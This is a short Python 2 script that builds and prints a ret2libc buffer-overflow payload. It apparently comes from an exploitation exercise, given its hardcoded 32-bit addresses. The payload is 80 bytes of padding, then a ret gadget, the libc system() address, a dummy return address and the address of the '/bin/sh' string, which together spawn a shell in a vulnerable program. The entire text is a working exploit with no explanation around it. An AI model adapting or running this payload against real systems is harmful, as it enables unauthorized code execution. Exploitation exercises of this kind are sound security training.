import struct
padding = "A" * 80
retGadget = struct.pack("I",0x08048553)
system = struct.pack("I",0xb7ecffb0)
retFromSystem = "AAAA"
binsh = struct.pack("I",0xb7e97000 + 0x11f3bf)
exploit = padding + retGadget + system + retFromSystem + binsh
print exploit
